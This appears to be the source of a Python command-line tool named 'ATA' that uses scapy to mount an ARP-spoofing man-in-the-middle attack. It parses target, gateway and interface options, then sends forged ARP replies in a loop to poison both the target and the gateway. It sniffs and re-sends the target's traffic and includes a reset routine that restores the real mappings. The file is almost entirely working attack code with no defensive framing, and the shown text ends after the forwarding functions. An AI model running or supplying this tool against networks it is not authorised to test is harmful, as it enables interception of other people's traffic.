from scapy.all import ARP, Ether, sr1, send, sniff, IP, get_if_hwaddr
import colorama, time, sys, subprocess, threading

HELP_FLAG = '-h'

HELP_MESSAGE = f"""
ATA ({colorama.Fore.RED}Man-In-The-Middle{colorama.Fore.WHITE}):
A simple tool for packet interception.

[Required]:
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-t{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the target for the attack.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-i{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the desired network interface.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-g{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the gateway of your network.

[Optional]:
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-s{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the origin of the attack.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-l{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the length of the attack.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-d{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the packet drop interval.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-p{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the interval of each packet.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-v{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Display more information.
{colorama.Style.DIM}[{colorama.Style.RESET_ALL}-v{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Display even more information.
"""

stop_event = threading.Event()

def CheckFlags(required, arguments):
	if HELP_FLAG in arguments: PrintMessage(code=1)

	for flag in required:
		if flag not in arguments: PrintMessage(code=1)

def PopulateFields(parameters):
	for argument in range(0, len(sys.argv)):
		match sys.argv[argument]:
			case '-s':
				parameters["Attacker"] = sys.argv[argument + 1]
			case '-t':
				parameters["Target"] = sys.argv[argument + 1]
			case '-g':
				parameters["Gateway"] = sys.argv[argument + 1]
			case '-i':
				parameters["Interface"] = sys.argv[argument + 1]
			case '-l':
				parameters["Duration"] = int(sys.argv[argument + 1])
			case '-d':
				parameters["Timeout"] = int(sys.argv[argument + 1])
			case '-p':
				parameters["Interval"] = int(sys.argv[argument + 1])
			case '-v':
				parameters["Verbose"] = True
			case '-vv':
				parameters["Verbose"] = True
				parameters["Verboser"] = True
	return parameters

def PrintMessage(message="", code=-1):
	white = colorama.Fore.WHITE
	match code:
		case 0:
			print(f"{colorama.Style.DIM}[{colorama.Style.RESET_ALL}{white}*{colorama.Style.RESET_ALL}{colorama.Style.DIM}]{colorama.Style.RESET_ALL} {message}")
		case -1:
			print(f"{colorama.Style.DIM}[{colorama.Style.RESET_ALL}{white}*{colorama.Style.RESET_ALL}{colorama.Style.DIM}]{colorama.Style.RESET_ALL} {message}")
			sys.exit()
		case 1:
			print(HELP_MESSAGE)
			sys.exit()

def GetMAC(destination, timeout, interface):
	arp_request = ARP(pdst=destination)
	response = sr1(arp_request, iface=interface, timeout=timeout, verbose=False)

	if response:
		return response.hwsrc

	return None

def Reset(message, gateway, gateway_mac, target, target_mac):
	gateway_packet  = ARP(op=2, psrc=gateway, pdst=target,  hwsrc=gateway_mac, hwdst=target_mac)
	target_packet = ARP(op=2, psrc=target,  pdst=gateway, hwsrc=target_mac,  hwdst=gateway_mac)

	send(gateway_packet, count=1, verbose=False)
	send(target_packet,  count=1, verbose=False)

	PrintMessage((gateway_packet.summary(), target_packet.summary()), 0)
	PrintMessage(message, -1)

def Spoof(verbose, interval, gateway, gateway_mac, target, target_mac, attacker_mac):
	while not stop_event.is_set():
		gateway_packet  = ARP(op=2, psrc=gateway, pdst=target,  hwsrc=attacker_mac, hwdst=target_mac)
		target_packet = ARP(op=2, psrc=target,  pdst=gateway, hwsrc=attacker_mac, hwdst=gateway_mac)
		
		if verbose:
			PrintMessage((target_packet.summary(), gateway_packet.summary()), 0)

		send(gateway_packet, count=1, verbose=False)
		send(target_packet,  count=1, verbose=False)

		time.sleep(interval)

def ForwardSent(verbose, target, interface):
	while not stop_event.is_set():
		packet = sniff(filter="ip", iface=interface, count=1)[0]

		if not packet.haslayer(IP):
			continue

		if packet[IP].src == target:
			if verbose:
				PrintMessage(f"(Sent) {packet.summary()}", 0)
			send(packet, iface=interface, count=1, verbose=False)

def ForwardReceived(verbose, target, interface):
	while not stop_event.is_set():
		packet = sniff(filter="ip", iface=interface, count=1)[0]

		if not packet.haslayer(IP):
			continue

		if packet[IP].dst == target:
			if verbose:
				PrintMessage(f"(Received) {packet.summary()}", 0)
			send(packet, iface=interface, count=1, verbose=False)